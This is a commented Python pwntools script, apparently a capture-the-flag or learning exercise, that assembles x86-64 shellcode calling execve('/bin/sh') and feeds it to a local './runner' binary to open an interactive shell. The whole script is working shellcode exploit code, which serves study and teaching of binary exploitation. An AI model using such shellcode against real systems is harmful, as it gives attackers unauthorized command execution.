#!/usr/bin/env python3

from pwn import *

# Set the architecture to 64-bit (amd64)
context.arch = "amd64"

# The following commented block demonstrates some simple assembly code
# The 'mov' instruction moves a value into a register, and 'lea' computes addresses.
# The values inside the brackets refer to memory locations or computed addresses.
# This demo block isn't used in the actual exploit but gives an example of using `asm` in pwntools.
# demo = asm("""
#     mov rax, [rsp + 4]  # Move a value from the stack into the rax register
#     lea rax, [rbx*10 + rcx]  # Load effective address into rax (compute address from rbx and rcx)
# """)

def exploit():
    # Convert the string "/bin/sh" to its hexadecimal representation in reverse order,
    # as required by the little-endian format of most systems.
    asm_hex = "0x" + ''.join(reversed([hex(ord(x))[2:] for x in "/bin/sh"]))

    # The following assembly code is to execute `execve("/bin/sh", NULL, NULL)`:
    # 1. Clear the rsi register (second argument to execve for the argv[] array).
    # 2. Clear the rdx register (third argument to execve for the envp[] array).
    # 3. Move "/bin/sh" into rax. This line prepares to store the /bin/sh string on the stack.
    # 4. Push rax onto the stack.
    # 5. Move the address of "/bin/sh" (stored in rsp) into rdi (first argument to execve).
    # 6. Move the system call number for execve (usually 59 on Linux) into rax.
    # 7. Invoke the syscall to execute execve.

    shellcode = asm(
        "xor rsi, rsi\n"            # Clear rsi (argv is NULL)
        "xor rdx, rdx\n"            # Clear rdx (envp is NULL)
        f"mov rax, {asm_hex}\n"     # Load the hex representation of "/bin/sh" into rax
        "push rax\n"                # Push the "/bin/sh" string onto the stack
        "mov rdi, rsp\n"            # Move the pointer to "/bin/sh" into rdi (first argument)
        "mov rax, 59\n"             # Syscall number for execve (on Linux, execve's syscall number is 59) -- alternatively, use SYS_execve
        "syscall\n"                 # Trigger the syscall to execute execve("/bin/sh", NULL, NULL)
    )
    
    print(shellcode)
    # Print the assembled shellcode (machine code) for debugging purposes
    return shellcode

if __name__ == '__main__':
    shellcode = exploit()

    p = process('./runner')
    p.send(shellcode)    
    p.interactive()        